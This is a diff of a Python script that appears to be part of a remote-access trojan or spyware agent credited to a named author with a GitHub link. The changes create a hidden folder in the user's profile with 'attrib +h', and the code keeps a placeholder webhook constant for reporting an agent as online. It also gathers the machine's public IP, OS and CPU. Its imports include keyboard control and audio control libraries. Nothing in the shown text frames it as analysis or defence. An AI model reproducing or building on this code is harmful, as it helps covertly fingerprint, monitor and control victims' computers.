@@ -1,4 +1,5 @@
-#pull-request test
+### Imports
+
 from pynput.keyboard import Key, Controller
 from tkinter import messagebox
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
@@ -46,7 +47,11 @@ import threading
 import re
 import folium
 
-try:
+
+usr = getpass.getuser()
+path_install = fr"C:\Users\{usr}\.config"
+
+if not os.path.exists(path_install):
     import os
     usr = getpass.getuser()
     path = fr'"C:\Users\{usr}\.config"'
@@ -54,7 +59,7 @@ try:
     new_path = new_path[:-1]
     os.mkdir(new_path)     
     os.system(f"attrib +h {path}")
-except:
+else:
     pass
 
 AGENT_ONLINE_ID = "[AGENT_ONLINE_WBHOOK]"
@@ -69,7 +74,6 @@ version = "v1.0.0"
 author = "Vczz0"
 github_link = "https://github.com/Vczz0"
 
-usr = getpass.getuser()
 ip = get('https://api.ipify.org').text
 os = platform.system() 
 cpu = platform.processor() 
